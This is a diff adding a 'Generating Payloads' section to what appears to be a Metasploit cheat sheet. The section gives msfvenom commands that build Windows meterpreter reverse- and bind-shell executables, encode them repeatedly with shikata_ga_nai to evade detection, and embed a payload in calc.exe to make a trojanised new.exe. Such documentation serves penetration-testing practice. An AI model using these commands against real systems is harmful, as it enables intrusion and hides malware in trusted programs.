@@ -81,7 +81,20 @@ exploit
 
 # Generating Payloads
 
-(more to come)
+List all the payloads available, you can do the following (also the same for listing encoders, nops, or all):
+./msfvenom -l payloads
+
+Generating a windows/meterpreter/reverse_tcp: 
+./msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -f exe
+
+Generate a payload that avoids certain bad characters:
+./msfvenom -p windows/meterpreter/bind_tcp -b '\x00'
+
+Generate a payload with a specific encoder, and then encode 3 times:
+./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
+
+Inject a payload to calc.exe, and save it as new.exe 
+./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -k -f exe > new.exe
 ------------------------------------------------------------------------------------------------------
 
 # Database
